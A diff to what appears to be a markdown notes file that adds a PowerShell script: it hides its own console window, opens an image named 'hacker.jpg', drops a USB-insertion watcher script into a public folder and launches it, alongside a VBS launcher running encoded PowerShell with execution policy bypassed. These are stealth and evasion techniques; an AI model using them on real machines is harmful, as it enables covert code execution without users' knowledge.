@@ -138,5 +138,41 @@ pSCmd = "powershell.exe -noexit -windowstyle Hidden -executionpolicy bypass -enc
 
 CreateObject("WScript.Shell").Run pSCmd, 0, True
 ```
+---
 
 
+The Script can be executed through a shortcut.
+
+Script to start a sub process that listenes to newly inserted USB devices.
+```
+# .Net methods for hiding/showing the console in the background
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+function Hide-Console
+{
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    #0 hide
+    [Console.Window]::ShowWindow($consolePtr, 0)
+}
+Hide-Console
+$Script = @'
+    $Devices = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }
+    $DeviceCount= $Devices.Count
+    while ($Devices.Count -le $DeviceCount) {
+        Write-Host "Waiting for USB devices to be connected..."
+        $Devices = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }
+        Start-Sleep -Seconds 0.1
+    }
+    Stop-Process -ID $PID
+'@
+Start-Process hacker.jpg
+
+Remove-Item -Path "C:\Users\Public\Documents\test.ps1" -Force
+New-Item -Path "C:\Users\Public\Documents\test.ps1" -ItemType "file" -Value $Script
+Start-Process powershell.exe -ArgumentList "-noexit", "C:\Users\Public\Documents\test.ps1" #-WindowStyle Hidden 
+```
